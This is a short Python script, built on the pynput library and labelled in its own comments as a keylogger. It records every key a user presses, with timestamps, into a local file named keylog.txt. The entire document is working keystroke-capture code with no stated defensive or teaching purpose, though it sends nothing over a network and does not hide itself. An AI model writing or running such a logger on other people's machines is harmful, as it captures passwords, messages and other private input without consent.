import logging
from pynput import keyboard

# Set up logging
logging.basicConfig(filename=("keylog.txt"),
                    level=logging.DEBUG,
                    format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"{key}")

# Start the keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
